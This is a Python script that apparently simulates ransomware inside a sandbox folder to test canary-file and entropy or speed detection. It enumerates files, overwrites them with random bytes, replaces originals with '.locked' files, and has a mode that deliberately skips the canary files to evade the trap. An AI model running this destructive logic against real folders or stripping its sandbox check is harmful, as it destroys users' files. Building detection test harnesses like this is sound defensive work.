import os
import sys
import time

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DEMO_SANDBOX = os.path.abspath(os.path.join(BASE_DIR, "Demo_Protected_Folder"))
TRAP_NAME = "!000_Trap"


def verify_sandbox_safety(target_path):
    abs_target = os.path.abspath(target_path)
    assert abs_target.startswith(DEMO_SANDBOX) and "Demo_Protected_Folder" in abs_target, (
        f"SAFETY VIOLATION: Target {abs_target} is outside Demo_Protected_Folder!"
    )


def list_trap_files():
    trap_folder = os.path.join(DEMO_SANDBOX, TRAP_NAME)
    verify_sandbox_safety(trap_folder)
    if not os.path.isdir(trap_folder):
        return []
    return [os.path.join(trap_folder, f) for f in sorted(os.listdir(trap_folder))]


def list_main_files():
    out = []
    for root, dirs, files in os.walk(DEMO_SANDBOX):
        dirs[:] = [d for d in dirs if d != TRAP_NAME]
        for f in sorted(files):
            if f.endswith(".locked"):
                continue
            out.append(os.path.join(root, f))
    return out


def attack_file(fp, mode):
    verify_sandbox_safety(fp)
    if mode == "partial":
        with open(fp, "r+b") as out:
            out.seek(0)
            out.write(os.urandom(4096))
    elif mode == "trap":
        with open(fp, "wb") as out:
            out.write(os.urandom(8192))
    else:
        locked_fp = fp + ".locked"
        verify_sandbox_safety(locked_fp)
        with open(locked_fp, "wb") as out:
            out.write(os.urandom(32768))
        os.remove(fp)


def simulate_ransomware(mode="normal"):
    """
    Modes:
      normal / partial / slow : enumerates like real ransomware. The hidden folder
                                '!000_Trap' sorts first, so the canary files are hit
                                BEFORE any user file.
      trap                    : touches ONLY the canary folder.
      notrap                  : trap-evading attack (skips canaries) so entropy /
                                speed detection can be demonstrated.
    """
    verify_sandbox_safety(DEMO_SANDBOX)
    if not os.path.exists(DEMO_SANDBOX):
        return

    if mode == "trap":
        targets = list_trap_files()
    elif mode == "notrap":
        targets = list_main_files()
    else:
        targets = list_trap_files() + list_main_files()

    delay = 1.2 if mode == "slow" else (0.18 if mode == "trap" else 0.22)
    attack_mode = "normal" if mode == "notrap" else mode

    for fp in targets:
        try:
            if not os.path.exists(fp):
                continue
            attack_file(fp, attack_mode)
            time.sleep(delay)
        except Exception:
            pass


if __name__ == "__main__":
    attack_mode = sys.argv[1] if len(sys.argv) > 1 else "normal"
    simulate_ransomware(attack_mode)